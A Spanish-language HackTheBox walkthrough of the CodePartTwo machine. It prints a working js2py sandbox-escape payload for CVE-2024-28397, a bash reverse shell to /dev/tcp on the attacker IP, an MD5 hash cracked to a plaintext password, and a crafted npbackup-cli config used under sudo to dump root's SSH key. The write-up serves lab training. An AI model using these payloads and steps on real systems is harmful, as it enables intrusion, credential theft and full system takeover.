Propiedades:
- OS: Linux
- Plataforma: HackTheBox
- Nivel: Easy
- Tags: #sudo #js2py #npbackup #CVE-2024-28397

![](assets/Pasted%20image%2020260113200151.png)
## Reconocimiento

Comienzo tirando un ping para comprobar la conectividad.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/codepartwo]
└─$ ping -c 1 10.10.11.82
PING 10.10.11.82 (10.10.11.82) 56(84) bytes of data.
64 bytes from 10.10.11.82: icmp_seq=1 ttl=63 time=86.2 ms

--- 10.10.11.82 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 86.244/86.244/86.244/0.000 ms
```

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/codepartwo]
└─$ sudo nmap -p- -Pn -n -sS --min-rate 5000 -vvv 10.10.11.82 -oG nmap/allPorts

PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 63
8000/tcp open  http-alt syn-ack ttl 63
```

Sobre los puertos abiertos realizo un segundo escaneo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/codepartwo]
└─$ sudo nmap -p 22,8000 -sV -sC -Pn -n -vvv -sS --min-rate 5000 10.10.11.82 -oN nmap/target

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCnwmWCXCzed9BzxaxS90h2iYyuDOrE2LkavbNeMlEUPvMpznuB9cs8CTnUenkaIA8RBb4mOfWGxAQ6a/nmKOea1FA6rfGG+fhOE/R1g8BkVoKGkpP1hR2XWbS3DWxJx3UUoKUDgFGSLsEDuW1C+ylg8UajGokSzK9NEg23WMpc6f+FORwJeHzOzsmjVktNrWeTOZthVkvQfqiDyB4bN0cTsv1mAp1jjbNnf/pALACTUmxgEemnTOsWk3Yt1fQkkT8IEQcOqqGQtSmOV9xbUmv6Y5ZoCAssWRYQ+JcR1vrzjoposAaMG8pjkUnXUN0KF/AtdXE37rGU0DLTO9+eAHXhvdujYukhwMp8GDi1fyZagAW+8YJb8uzeJBtkeMo0PFRIkKv4h/uy934gE0eJlnvnrnoYkKcXe+wUjnXBfJ/JhBlJvKtpLTgZwwlh95FJBiGLg5iiVaLB2v45vHTkpn5xo7AsUpW93Tkf+6ezP+1f3P7tiUlg3ostgHpHL5Z9478=
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBErhv1LbQSlbwl0ojaKls8F4eaTL4X4Uv6SYgH6Oe4Y+2qQddG0eQetFslxNF8dma6FK2YGcSZpICHKuY+ERh9c=
|   256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEJovaecM3DB4YxWK2pI7sTAv9PrxTbpLG2k97nMp+FM
8000/tcp open  http    syn-ack ttl 63 Gunicorn 20.0.4
|_http-title: Welcome to CodePartTwo
| http-methods:
|_  Supported Methods: GET OPTIONS HEAD
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Tenemos:

- Puerto 8000 HTTP: Gunicorn 20.0.4
- Puerto 22 SSH: OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
## Enumeración

### Puerto 8000 HTTP

Al parecer la pagina es una aplicaciones para ejecutar y guardar codigo JavaScript. La aplicaciones es open source y nos brindan el codigo de la app en un `zip`.

![](assets/Pasted%20image%2020260113163346.png)


Tenemos un formulario de registro:


![](assets/Pasted%20image%2020260113163404.png)

Me cree una cuenta y accedí al dashboard general:

- Aqui puedo ejecutar codigo javascript y se ve reflejado.

![](assets/Pasted%20image%2020260113184617.png)

#### Headers.

Por los headers puedo ver que corre el servidor web gunicorn/20.0.4.

- gunicorn es un servidor web para aplicaciones basadas en Python.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/codepartwo]
└─$ curl -I http://10.10.11.82:8000/

HTTP/1.1 200 OK
Server: gunicorn/20.0.4
Date: Tue, 13 Jan 2026 22:35:40 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 2212
```

#### Source Code.

La aplicación es Open Source y ellos te comparten el zip con el codigo de la aplicación.

- Así se ve la estructura:

```bash
┌──(wndr㉿wndr)-[~/…/hackthebox/codepartwo/content/app]
└─$ tree
.
├── app.py
├── instance
│   └── users.db
├── requirements.txt
├── static
│   ├── css
│   │   └── styles.css
│   └── js
│       └── script.js
└── templates
    ├── base.html
    ├── dashboard.html
    ├── index.html
    ├── login.html
    ├── register.html
    └── reviews.html

6 directories, 11 files
```

Tenemos varias cosas interesante, como un archivo Sqlite:

```bash
┌──(wndr㉿wndr)-[~/…/hackthebox/codepartwo/content/app]
└─$ file instance/users.db
instance/users.db: SQLite 3.x database, last written using SQLite version 3031001, file counter 2, database pages 4, cookie 0x2, schema 4, UTF-8, version-valid-for 2
```

- Enumere la base de datos pero no habia nada.

En el requirements.txt podemos ver las versiones que se usan:

```
┌──(wndr㉿wndr)-[~/…/hackthebox/codepartwo/content/app]
└─$ cat requirements.txt
flask==3.0.3
flask-sqlalchemy==3.1.1
js2py==0.74
```

- Flask como Framework.
- sqlalchemy como ORM
- js2py es lo que se usa para ejecutar codigo `js` en la web.


Y el codigo fuente de la app principal.

- `app.py`

```python
from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory
from flask_sqlalchemy import SQLAlchemy
import hashlib
import js2py
import os
import json

js2py.disable_pyimport()
app = Flask(__name__)
app.secret_key = 'S3cr3tK3yC0d3PartTw0'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(128), nullable=False)

class CodeSnippet(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    code = db.Column(db.Text, nullable=False)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/dashboard')
def dashboard():
    if 'user_id' in session:
        user_codes = CodeSnippet.query.filter_by(user_id=session['user_id']).all()
        return render_template('dashboard.html', codes=user_codes)
    return redirect(url_for('login'))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        password_hash = hashlib.md5(password.encode()).hexdigest()
        new_user = User(username=username, password_hash=password_hash)
        db.session.add(new_user)
        db.session.commit()
        return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        password_hash = hashlib.md5(password.encode()).hexdigest()
        user = User.query.filter_by(username=username, password_hash=password_hash).first()
        if user:
            session['user_id'] = user.id
            session['username'] = username;
            return redirect(url_for('dashboard'))
        return "Invalid credentials"
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('user_id', None)
    return redirect(url_for('index'))

@app.route('/save_code', methods=['POST'])
def save_code():
    if 'user_id' in session:
        code = request.json.get('code')
        new_code = CodeSnippet(user_id=session['user_id'], code=code)
        db.session.add(new_code)
        db.session.commit()
        return jsonify({"message": "Code saved successfully"})
    return jsonify({"error": "User not logged in"}), 401

@app.route('/download')
def download():
    return send_from_directory(directory='/home/app/app/static/', path='app.zip', as_attachment=True)

@app.route('/delete_code/<int:code_id>', methods=['POST'])
def delete_code(code_id):
    if 'user_id' in session:
        code = CodeSnippet.query.get(code_id)
        if code and code.user_id == session['user_id']:
            db.session.delete(code)
            db.session.commit()
            return jsonify({"message": "Code deleted successfully"})
        return jsonify({"error": "Code not found"}), 404
    return jsonify({"error": "User not logged in"}), 401

@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(host='0.0.0.0', debug=True)
```

- Podemos notar un secreto hardocdeado: `S3cr3tK3yC0d3PartTw0`
- Podemos ver que las contraseñas se guardan en md5: `hashlib.md5(password.encode()).hexdigest()`

## Explotación

!!! info
    **Js2Py** es una biblioteca de Python que funciona como un **traductor e intérprete de JavaScript escrito 100% en Python puro**. Permite a los desarrolladores de Python ejecutar código JavaScript directamente dentro de un entorno Python y traducir archivos JavaScript completos a código Python equivalente.

Parte del codigo principal en `app.py` utiliza `js2py` para traducir codigo javascript a codigo python:

```python
@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})
```

- Esta parte del codigo es la que se utiliza en la web para correr el codigo y mostrarlo.

Después de investigar encuentro que `js2py` es vulnerable al CVE-2024-28397 

- [Snyk Js2py](https://security.snyk.io/vuln/SNYK-PYTHON-JS2PY-7300331)
- [CVE-2024-28397](https://www.cve.org/CVERecord?id=CVE-2024-28397)

La vulnerabilidad existe en la función `js2py.disable_pyimport()` ya que no bloquea completamente referencias peligrosas ni protege apropiadamente el entorno de ejecución. Lo que nos permite el escape del sandbox y el acceso a objetos de python. Nuestro caso es aun peor ya que directamente se ejecuta `js2py.eval_js(code)` sin ningún sandbox real

Podemos utilizar el siguiente payload para ejecutar el comando id:

- El payload explota la exposición de objetos internos de Python a través del motor js2py. Mediante introspección (`__getattribute__`, `__class__`, `__subclasses__`), es posible localizar la clase `subprocess.Popen` y utilizarla para ejecutar comandos del sistema, resultando en ejecución remota de código (RCE).

```js
let cmd = "id"
let hacked, bymarve, n11
let getattr, obj
hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__
function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}
n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
n11[0].decode()
```


![](assets/Pasted%20image%2020260113171155.png)

Ahora que tengo RCE puedo entablarme una reverse-shell:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/codepartwo]
└─$ sudo nc -nlvp 9001
[sudo] password for wndr:
listening on [any] 9001 ...
```

En la web ejecutamos lo siguiente:

```js
let cmd = "bash -c 'bash -i >& /dev/tcp/10.10.15.108/9001 0>&1'"
let hacked, bymarve, n11
let getattr, obj
hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__
function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}
n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
n11[0].decode()
```

Y obtenemos acceso a la maquina.

```bash
connect to [10.10.15.108] from (UNKNOWN) [10.10.11.82] 37618
bash: cannot set terminal process group (818): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.0$ id
id
uid=1001(app) gid=1001(app) groups=1001(app)
bash-5.0$
```

## Escalada de Privilegios

Dentro de la maquina primero chequee que usuarios existían:

```bash
bash-5.0$ ls
app  marco

bash-5.0$ grep "sh" /etc/passwd
root:x:0:0:root:/root:/bin/bash
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
marco:x:1000:1000:marco:/home/marco:/bin/bash
app:x:1001:1001:,,,:/home/app:/bin/bash
```

- Aparte del root existe un usuario llamado marco.


En mi directorio `/home` tengo el codigo fuente de la app y recordemos que en el directorio `/instance` se encontraba una base de datos sqlite.

```bash
bash-5.0# cd app
bash-5.0# ls
app.py  instance  __pycache__  requirements.txt  static  templates
```

Puedo abrir la base de datos sqlite:

```bash
bash-5.0# cd instance
bash-5.0# sqlite3 users.db
```

Primero enumere las tablas:

```bash
sqlite> .tables
code_snippet  user
```

Me interesa la tabla users por lo cual voy a ver todo su contenido:

```bash
sqlite> select * from user;
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
```

Vemos que el usuario marco tiene un hash `md5` el cual puedo crackear con hashcat:

```bash
┌──(wndr㉿wndr)-[~/…/hackthebox/codepartwo/content/app]
└─$ hashcat -m 0 649c9d65a206a75f5abe509fe128bce5 /usr/share/wordlists/rockyou.txt

649c9d65a206a75f5abe509fe128bce5:sweetangelbabylove
```

- sweetangelbabylove es la contraseña de marco.

Estas credenciales me sirven para conectarme mediante SSH.

- marco / sweetangelbabylove

```bash
┌──(wndr㉿wndr)-[~/…/hackthebox/codepartwo/content/app]
└─$ ssh marco@10.10.11.82
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
marco@10.10.11.82's' password:

-bash-5.0$ id
uid=1000(marco) gid=1000(marco) groups=1000(marco),1003(backups)
```

- Con `id` puedo ver que pertenezco a un grupo llamado backups.

La flag estaba en el directorio home:

```bash
-bash-5.0$ cat user.txt
ffc7114ed4ab********
```

Ahora puedo tratar de enumerar binarios con privilegios de SUDO: 

```bash
-bash-5.0$ sudo -l
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

- Encuentro que npbackup-cli puede ser ejecutado como cualquier usuario sin necesidad de contraseña.

!!! info
    **NPBackup** es una herramienta de **backups** (copias de seguridad) pensada para servidores y sistemas Linux.

Si lo ejecuto puedo ver esto:

```bash
-bash-5.0$ sudo /usr/local/bin/npbackup-cli
2026-01-13 23:47:04,692 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2026-01-13 23:47:04,692 :: CRITICAL :: Cannot run without configuration file.
2026-01-13 23:47:04,697 :: INFO :: ExecTime = 0:00:00.006972, finished, state is: critical.
```

- No puede correr sin un archivo de configuración

Podemos abusar de npbackup-cli para que cree un backup del directorio `/root` manipulando el archivo de configuración:

- npbackup.conf:

```
conf_version: 3.0.1
audience: public

repos:
  default:
    repo_uri: /dev/shm/npbackup_repo
    repo_group: default_group
    backup_opts:
      paths:
        - /root
      source_type: folder_list
    repo_opts:
      repo_password: "P4ssw0rd123!"
      retention_policy: {}
      prune_max_unused: 0
    prometheus: {}
    env: {}
    is_protected: false

groups:
  default_group:
    backup_opts:
      paths: []
      source_type:
      tags: []
      compression: auto
      use_fs_snapshot: true
      ignore_cloud_files: true
      one_file_system: false
      priority: low
      exclude_caches: true
      excludes_case_ignore: false
      exclude_files:
        - excludes/generic_excluded_extensions
      exclude_patterns: []
      exclude_files_larger_than:
      additional_parameters:
      additional_backup_only_parameters:
      minimum_backup_size_error: 10 MiB
      pre_exec_commands: []
      pre_exec_per_command_timeout: 3600
      pre_exec_failure_is_fatal: false
      post_exec_commands: []
      post_exec_per_command_timeout: 3600
      post_exec_failure_is_fatal: false
      post_exec_execute_even_on_backup_error: true
      post_backup_housekeeping_percent_chance: 0
      post_backup_housekeeping_interval: 0
    repo_opts:
      repo_password: "P4ssw0rd123!"
      minimum_backup_age: 0
      upload_speed: 800 Mib
      download_speed: 0 Mib
      backend_connections: 0
      retention_policy:
        last: 3
        hourly: 72
        daily: 30
        weekly: 4
        monthly: 12
        yearly: 3
        tags: []
      prune_max_unused: 0
    prometheus:
      backup_job: ${MACHINE_ID}
      group: ${MACHINE_GROUP}
    env:
      env_variables: {}
      encrypted_env_variables: {}
    is_protected: false

users:
  marco: {}
```

Ahora ejecutamos lo siguiente para generar un backup del directorio `root`.

```bash
-bash-5.0$ sudo npbackup-cli -c npbackup.conf -b

-bash-5.0$ ls
npbackup.conf  npbackup_repo
```

Para ver el contenido del backup necesite el id:

```bash
-bash-5.0$ sudo npbackup-cli -c npbackup.conf -s

ID        Time                 Host         Tags        Paths  Size
--------------------------------------------------------------------------
d56b89b7  2026-01-14 00:17:21  codeparttwo              /root  197.660 KiB
-------------------------------------------------------------------------
```

Y ahora con el id puedo listar el contenido del backup:

```bash
-bash-5.0$ sudo npbackup-cli -c /dev/shm/npbackup.conf --ls --snapshot-id d56b89b7

/root
/root/.bash_history
/root/.bashrc
/root/.cache
/root/.cache/motd.legal-displayed
/root/.local
/root/.local/share
/root/.local/share/nano
/root/.local/share/nano/search_history
/root/.mysql_history
/root/.profile
/root/.python_history
/root/.sqlite_history
/root/.ssh
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
/root/.vim
/root/.vim/.netrwhist
/root/root.txt
/root/scripts
/root/scripts/backup.tar.gz
/root/scripts/cleanup.sh
/root/scripts/cleanup_conf.sh
/root/scripts/cleanup_db.sh
/root/scripts/cleanup_marco.sh
/root/scripts/npbackup.conf
/root/scripts/users.db
```

Veo que existe una clave ssh la cual puedo dumpear:

```bash
-bash-5.0$ sudo npbackup-cli \
>   -c /dev/shm/npbackup.conf \
>   --dump /root/.ssh/id_rsa \
>   --snapshot-id d56b89b7 > id_rsa

-bash-5.0$ ls
id_rsa
```

Le damos permisos a la clave:

```bash
chmod 600 id_rsa
```

Y nos conectamos por ssh:

```bash
bash-5.0$ ssh -i id_rsa root@10.10.11.82

Last login: Wed Jan 14 00:19:32 2026 from 10.10.11.82
root@codeparttwo:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Obtenmos la flag:

```bash
root@codeparttwo:~# cat root.txt
d10bcdcc4dfd*******
```

***PWNED***

![](assets/Pasted%20image%2020260113173843.png)
